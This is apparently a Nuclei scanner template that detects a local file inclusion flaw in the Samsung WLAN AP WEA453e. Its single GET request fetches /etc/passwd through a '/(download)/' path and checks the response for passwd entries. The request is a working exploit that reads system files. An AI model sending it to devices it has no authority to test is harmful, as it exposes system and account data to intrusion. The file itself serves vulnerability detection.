id: samsung-wlan-ap-lfi

info:
  name: Samsung WLAN AP WEA453e - Local File Inclusion
  author: pikpikcu
  severity: high
  description: Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities.
  reference:
    - https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba
  classification:
    cpe: cpe:2.3:a:samsung:samsung:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  metadata:
    max-request: 1
    vendor: samsung
    product: samsung
  tags: xss,samsung,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/(download)/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        name: samsung
        cpe: cpe:2.3:a:samsung:samsung:*:*:*:*:*:*:*:*
        regex:
          - "root:.*:0:0:"
          - "bin:.*:1:1"
        part: body

      - type: status
        status:
          - 200
